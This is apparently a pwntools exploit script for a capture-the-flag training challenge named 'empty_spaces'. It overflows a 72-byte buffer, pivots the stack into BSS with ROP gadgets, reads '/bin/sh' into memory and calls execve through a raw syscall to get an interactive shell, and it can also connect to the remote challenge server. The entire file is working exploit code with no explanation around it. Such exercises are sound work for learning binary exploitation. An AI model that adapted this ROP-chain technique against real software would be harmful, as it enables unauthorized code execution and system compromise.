from pwn import *

CHALL_PATH = "./empty_spaces"
CHALL = ELF(CHALL_PATH)
COMMANDS = """
b *0x40198C
c
"""
if args.REMOTE:
    p = remote("empty-spaces.training.offensivedefensive.it", "8080", ssl=True)
elif args.GDB:
    p = gdb.debug(CHALL_PATH, COMMANDS)
else:
    p = process(CHALL_PATH)

POP_RDI = 0x4787b3 # pop rdi; ret;
POP_RSI = 0x477d3d # pop rsi; ret;
POP_RAX_RDX = 0x45db52 # pop rax; pop rdx; leave; ret;
POP_RDX = 0x45db53 # pop rdx; leave; ret;
POP_RAX = 0x42146b #pop rax; ret;
SYSCALL_RET = 0x40ba76 # syscall; ret;
SYSCALL = 0x401324 # syscall
MOV_CHAIN = 0x4690f0 # mov rdx, qword ptr [rsi]; mov qword ptr [rdi], rdx; ret;
WRITE_BIN_SH_ADDR = 0x4aa050
MOV_RSP_RSI = 0x401910 # mov rsp, rsi; ret;
MOV_RBP_RSP = 0x419421 # mov rbp, rsp; call rax;
BSS = 0x4aa123
POP_RBP = 0x40191f# nop; pop rbp; ret;
READ_RET = 0x401987
NEW_POP_RDX = 0x4447d5# pop rdx; bsf eax, eax; add rax, rdi; vzeroupper; ret;
BUFFER_INIT = 0x4141414141414141
ADD_RSP = 0x401016 #add rsp, 8; ret;

#first read of main to replace the ret address of main function
payload = b"A" * 72

# replace all stack frame with the new stack frame of BSS + 8
payload += p64(POP_RBP)
payload += p64(BSS + 8)

# BSS to store the /bin/sh string
payload += p64(POP_RSI)
payload += p64(BSS)
payload += p64(NEW_POP_RDX)
payload += p64(100)

# get back to "mov edi, 0" utilizing this to set rdi to 0
payload += p64(READ_RET)

# just as a null terminator to work properly
payload += p64(0)
p.recvuntil(b"to pwn?")
p.send(payload)

#second read of main
payload = b"/bin/sh\x00\x00"
payload += b"A"*7
payload += p64(NEW_POP_RDX)
payload += p64(0)
payload += p64(POP_RDI)
payload += p64(BSS)
payload += p64(POP_RSI)
payload += p64(0)
payload += p64(POP_RAX)
payload += p64(59)
payload += p64(SYSCALL)

p.send(payload)

p.interactive()
